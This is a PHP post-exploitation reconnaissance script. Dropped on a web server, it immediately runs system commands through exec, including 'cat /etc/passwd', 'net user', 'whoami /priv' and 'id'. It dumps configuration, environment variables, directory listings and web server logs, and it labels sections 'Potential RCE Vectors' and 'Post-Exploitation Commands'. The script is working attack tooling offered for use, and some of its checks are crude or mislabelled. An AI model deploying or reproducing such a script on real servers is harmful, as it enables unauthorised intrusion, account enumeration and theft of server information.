<?php

// ======================================================
// Written by: 𐊖𝖺𝔪𝖺𝖾ɭ
// ======================================================

// Function to safely execute commands
function safe_exec($cmd) {
    // Check if the 'exec' function is disabled
    if (in_array('exec', explode(',', ini_get('disable_functions')))) {
        return ["Can't execute commands because 'exec' is disabled."];
    }
    $output = [];
    $return_var = 0;
    exec($cmd, $output, $return_var);
    return $output;
}

// Function to check if a function is disabled
function is_function_disabled($function_name) {
    $disabled_functions = explode(',', ini_get('disable_functions'));
    return in_array($function_name, $disabled_functions);
}

// Function to get system information
function get_system_info() {
    $info = [];
    $info['OS'] = php_uname();
    $info['PHP Version'] = phpversion();
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'];
    $info['Server Name'] = $_SERVER['SERVER_NAME'];
    $info['Server Protocol'] = $_SERVER['SERVER_PROTOCOL'];
    $info['Server Port'] = $_SERVER['SERVER_PORT'];
    $info['Document Root'] = $_SERVER['DOCUMENT_ROOT'];
    $info['Remote Address'] = $_SERVER['REMOTE_ADDR'];
    $info['Remote Port'] = $_SERVER['REMOTE_PORT'];
    $info['Script Filename'] = $_SERVER['SCRIPT_FILENAME'];
    $info['Request Time'] = $_SERVER['REQUEST_TIME'];
    $info['Query String'] = $_SERVER['QUERY_STRING'];
    $info['Request Method'] = $_SERVER['REQUEST_METHOD'];
    $info['Request URI'] = $_SERVER['REQUEST_URI'];
    $info['Gateway Interface'] = $_SERVER['GATEWAY_INTERFACE'];
    return $info;
}

// Function to get PHP configuration
function get_php_config() {
    $config = [];
    $config['PHP Version'] = phpversion();
    $config['PHP OS'] = PHP_OS;
    $config['PHP API'] = php_sapi_name();
    $config['PHP Max Execution Time'] = ini_get('max_execution_time');
    $config['PHP Max Input Time'] = ini_get('max_input_time');
    $config['PHP Memory Limit'] = ini_get('memory_limit');
    $config['PHP Upload Max Filesize'] = ini_get('upload_max_filesize');
    $config['PHP Post Max Size'] = ini_get('post_max_size');
    $config['PHP Allow URL Fopen'] = ini_get('allow_url_fopen') ? 'Enabled' : 'Disabled';
    $config['PHP Display Errors'] = ini_get('display_errors') ? 'Enabled' : 'Disabled';
    $config['PHP Log Errors'] = ini_get('log_errors') ? 'Enabled' : 'Disabled';
    $config['PHP Error Reporting'] = error_reporting();
    $config['PHP Safe Mode'] = ini_get('safe_mode') ? 'Enabled' : 'Disabled';
    $config['PHP Open Base Directory'] = ini_get('open_basedir');
    $config['PHP Disable Functions'] = ini_get('disable_functions');
    $config['PHP Disable Classes'] = ini_get('disable_classes');
    return $config;
}

// Function to get loaded PHP extensions
function get_loaded_php_extensions() {
    return get_loaded_extensions();
}

// Function to get environment variables
function get_environment_variables() {
    $env_vars = [];
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $env_vars['SystemRoot'] = getenv('SystemRoot');
        $env_vars['windir'] = getenv('windir');
        $env_vars['ProgramFiles'] = getenv('ProgramFiles');
        $env_vars['ProgramFiles(x86)'] = getenv('ProgramFiles(x86)');
        $env_vars['USERPROFILE'] = getenv('USERPROFILE');
        $env_vars['SystemRoot System32'] = getenv('SystemRoot') . '\\System32';
    } else {
        $env_vars['HOME'] = getenv('HOME');
        $env_vars['PATH'] = getenv('PATH');
        $env_vars['SHELL'] = getenv('SHELL');
        $env_vars['USER'] = getenv('USER');
    }
    return $env_vars;
}

// Function to get system directories
function get_system_directories() {
    $directories = [];
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $directories['System Directory'] = getenv('SystemRoot');
        $directories['Windows Directory'] = getenv('windir');
        $directories['Program Files'] = getenv('ProgramFiles');
        $directories['Program Files (x86)'] = getenv('ProgramFiles(x86)');
        $directories['Users Directory'] = getenv('USERPROFILE');
        $directories['Windows System Directory'] = getenv('SystemRoot') . '\\System32';
    } else {
        $directories['Home Directory'] = getenv('HOME');
        $directories['Root Directory'] = '/';
        $directories['Temporary Directory'] = '/tmp';
        $directories['Usr Directory'] = '/usr';
        $directories['Var Directory'] = '/var';
    }
    return $directories;
}

// Function to get potential RCE vectors
function get_potential_rce_vectors() {
    $vectors = [];
    $vectors['PHP Code Injection'] = 'Not Possible';
    $vectors['PHP File Upload'] = 'Possible';
    $vectors['PHP Safe Mode'] = ini_get('safe_mode') ? 'Enabled' : 'Disabled';
    $vectors['PHP Open Base Directory'] = ini_get('open_basedir') ? 'Restricted' : 'Not Restricted';
    $vectors['PHP Disable Functions'] = ini_get('disable_functions') ? 'Restricted' : 'Not Restricted';
    $vectors['PHP Disable Classes'] = ini_get('disable_classes') ? 'Restricted' : 'Not Restricted';
    return $vectors;
}

// Function to get post-exploitation commands
function get_post_exploitation_commands() {
    $commands = [];
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $commands['Get System Information'] = 'systeminfo';
        $commands['List Users'] = 'net user';
        $commands['List Groups'] = 'net localgroup';
        $commands['List Running Processes'] = 'tasklist';
        $commands['List Network Connections'] = 'netstat -ano';
        $commands['List Installed Software'] = 'wmic product get name';
        $commands['List Services'] = 'sc query';
        $commands['List Scheduled Tasks'] = 'schtasks /query';
    } else {
        $commands['Get System Information'] = 'uname -a';
        $commands['List Users'] = 'cat /etc/passwd';
        $commands['List Running Processes'] = 'ps aux';
        $commands['List Network Connections'] = 'netstat -tuln';
        $commands['List Installed Software'] = 'dpkg -l';
        $commands['List Services'] = 'systemctl list-units --type=service';
        $commands['List Scheduled Tasks'] = 'crontab -l';
    }
    return $commands;
}

// Function to check if shell commands are available
function check_shell_commands() {
    $commands = [];
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $commands = ['systeminfo', 'net user', 'net localgroup', 'tasklist', 'netstat -ano', 'wmic product get name', 'sc query', 'schtasks /query'];
    } else {
        $commands = ['uname -a', 'cat /etc/passwd', 'ps aux', 'netstat -tuln', 'dpkg -l', 'systemctl list-units --type=service', 'crontab -l'];
    }
    $available_commands = [];
    foreach ($commands as $cmd) {
        if (!is_function_disabled('exec')) {
            $output = safe_exec($cmd);
            if (!empty($output)) {
                $available_commands[] = $cmd;
            }
        }
    }
    return $available_commands;
}

// Function to check for privilege escalation
function check_privilege_escalation() {
    if (!is_function_disabled('exec')) {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $output = safe_exec('whoami /priv');
        } else {
            $output = safe_exec('id');
        }
        return $output;
    }
    return ["Can't check privilege escalation because 'exec' is disabled."];
}

// Function to list installed programs
function list_installed_programs() {
    if (!is_function_disabled('exec')) {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $output = safe_exec('wmic product get name');
        } else {
            $output = safe_exec('dpkg -l');
        }
        return $output;
    }
    return ["Can't list installed programs because 'exec' is disabled."];
}

// Function to identify the type of server
function identify_server_type() {
    $server_software = $_SERVER['SERVER_SOFTWARE'];
    if (strpos($server_software, 'Microsoft-IIS') !== false) {
        return 'IIS';
    } elseif (strpos($server_software, 'Apache') !== false) {
        return 'Apache';
    } elseif (strpos($server_software, 'nginx') !== false) {
        return 'Nginx';
    } elseif (strpos($server_software, 'ASP') !== false) {
        return 'ASP';
    } else {
        return 'Unknown';
    }
}

// Function to read server logs
function read_server_logs() {
    $server_type = identify_server_type();
    $log_file = '';
    switch ($server_type) {
        case 'IIS':
            $log_file = 'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log';
            break;
        case 'Apache':
            $log_file = '/var/log/apache2/access.log';
            break;
        case 'Nginx':
            $log_file = '/var/log/nginx/access.log';
            break;
        case 'ASP':
            $log_file = 'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log';
            break;
        default:
            return ["Can't read server logs because server type is unknown."];
    }
    if (!is_function_disabled('exec')) {
        $output = safe_exec("type $log_file");
        return $output;
    }
    return ["Can't read server logs because 'exec' is disabled."];
}

// Function to check for reverse shell capabilities
function check_reverse_shell() {
    if (!is_function_disabled('exec')) {
        $output = safe_exec('whoami');
        if (!empty($output)) {
            return ["Reverse shell capabilities available."];
        }
    }
    return ["Can't check reverse shell capabilities because 'exec' is disabled."];
}

// Function to check permissions
function check_permissions() {
    $permissions = [];
    if (!is_function_disabled('exec')) {
        $output = safe_exec('whoami');
        $permissions['Current User'] = $output[0];
        $output = safe_exec('icacls ' . $_SERVER['DOCUMENT_ROOT']);
        $permissions['Document Root Permissions'] = $output;
    } else {
        $permissions['Current User'] = "Can't check current user because 'exec' is disabled.";
        $permissions['Document Root Permissions'] = "Can't check document root permissions because 'exec' is disabled.";
    }
    return $permissions;
}

// Function to list files in a directory
function list_files_in_directory($directory) {
    if (!is_function_disabled('scandir')) {
        $files = scandir($directory);
        return $files;
    }
    return ["Can't list files in directory because 'scandir' is disabled."];
}

// Function to list all files in the current directory
function list_files_in_current_directory() {
    return list_files_in_directory(getcwd());
}

// Function to list all files in the root directory
function list_files_in_root_directory() {
    $root_directory = $_SERVER['DOCUMENT_ROOT'];
    return list_files_in_directory($root_directory);
}

// Function to get the web.config or php.ini file location
function get_config_file_location() {
    $config_file = '';
    if (strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS') !== false) {
        $config_file = 'C:\\inetpub\\wwwroot\\web.config';
    } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
        $config_file = '/etc/apache2/apache2.conf';
    } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'nginx') !== false) {
        $config_file = '/etc/nginx/nginx.conf';
    } else {
        $config_file = php_ini_loaded_file();
    }
    return $config_file;
}

// Function to get important system information
function get_important_system_info() {
    $info = [];
    if (!is_function_disabled('exec')) {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $info['System Uptime'] = safe_exec('systeminfo | find "System Up Time"')[0];
            $info['Disk Usage'] = safe_exec('wmic logicaldisk get size,freespace,caption')[0];
            $info['Memory Usage'] = safe_exec('systeminfo | find "Available Physical Memory"')[0];
        } else {
            $info['System Uptime'] = safe_exec('uptime -p')[0];
            $info['Disk Usage'] = safe_exec('df -h')[0];
            $info['Memory Usage'] = safe_exec('free -m')[0];
        }
    } else {
        $info['System Uptime'] = "Can't get system uptime because 'exec' is disabled.";
        $info['Disk Usage'] = "Can't get disk usage because 'exec' is disabled.";
        $info['Memory Usage'] = "Can't get memory usage because 'exec' is disabled.";
    }
    return $info;
}

// Main function to display all information
function display_info() {
    echo "<pre>";
    echo "System Information:\n";
    print_r(get_system_info());
    echo "\nPHP Configuration:\n";
    print_r(get_php_config());
    echo "\nLoaded PHP Extensions:\n";
    print_r(get_loaded_php_extensions());
    echo "\nEnvironment Variables:\n";
    print_r(get_environment_variables());
    echo "\nSystem Directories:\n";
    print_r(get_system_directories());
    echo "\nPotential RCE Vectors:\n";
    print_r(get_potential_rce_vectors());
    echo "\nPost-Exploitation Commands:\n";
    print_r(get_post_exploitation_commands());
    echo "\nAvailable Shell Commands:\n";
    print_r(check_shell_commands());
    echo "\nPrivilege Escalation:\n";
    print_r(check_privilege_escalation());
    echo "\nInstalled Programs:\n";
    print_r(list_installed_programs());
    echo "\nServer Type:\n";
    echo identify_server_type() . "\n";
    echo "\nServer Logs:\n";
    print_r(read_server_logs());
    echo "\nReverse Shell Capabilities:\n";
    print_r(check_reverse_shell());
    echo "\nPermissions:\n";
    print_r(check_permissions());
    echo "\nFiles in Current Directory:\n";
    print_r(list_files_in_current_directory());
    echo "\nFiles in Root Directory:\n";
    print_r(list_files_in_root_directory());

    echo "\nConfig File Location:\n";
    echo get_config_file_location() . "\n";
    echo "\nImportant System Information:\n";
    print_r(get_important_system_info());
    echo "</pre>";
}

// Execute the main function
display_info();
?>
